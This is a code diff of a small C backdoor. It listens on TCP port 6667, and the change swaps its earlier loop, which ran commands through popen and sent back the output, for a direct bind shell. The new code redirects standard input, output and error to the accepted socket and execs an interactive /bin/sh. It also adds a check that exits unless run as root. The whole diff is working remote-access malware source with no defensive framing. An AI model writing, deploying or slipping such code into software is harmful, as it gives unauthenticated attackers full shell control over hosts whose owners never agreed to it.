@@ -27,20 +27,26 @@
 #define MAXLINE 1000
 #define PORT 6667
 
-int main(){
+int main()
+{
    
    int TCP, LIST;
    struct sockaddr_in cli;
-   char buff[ MAXLINE ], cmd[ MAXLINE ], sendx[ MAXLINE ];
-   FILE *fp;
+   char buff[ MAXLINE ];
    
    _print_header();
-   
+    
+   if(testroot() == -1)
+   {
+   	printf( "You're not allowed to use me.\n"
+              	"Contact the system administrator\n" );
+      	exit( EXIT_FAILURE );
+   }
    if( ( LIST = socket( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
       die();
       
    sock_init( &cli, INADDR_ANY , PORT );
-   
+    
    if( ( bind( LIST, ( struct sockaddr * ) &cli, sizeof( cli ) ) ) < 0 )
       die();
    
@@ -49,27 +55,16 @@ int main(){
    
    if( ( TCP = accept( LIST, ( struct sockaddr * ) NULL, NULL ) ) < 0 )
       die();
-   
-   while( 1 ){
-   
-      if( ( recv( TCP, cmd, sizeof( cmd ), 0 ) ) < 0 )
-         die();
       
-      if( ( fp = popen( cmd, "r" ) ) < 0 )
-         die();
+   close(0);
+   close(1);
+   close(2);
       
-      while( fgets( buff, sizeof( buff ), fp ) > 0 )
-         strcat( sendx, buff );
-         
-      if( send( TCP, sendx , sizeof( sendx ), 0 ) < 0 )
-         die();
+   dup2(TCP, 0);
+   dup2(TCP, 1);
+   dup2(TCP, 2);
       
-      memset( sendx, 0x0, sizeof( sendx ) );
-      memset( buff, 0x0, sizeof( buff ) );
-      memset( cmd, 0x0, sizeof( cmd ) );
-      pclose( fp );
-      
-      }
+   execl("/bin/sh", "/bin/sh", "-i", NULL);
    
    close( LIST );
    close( TCP );
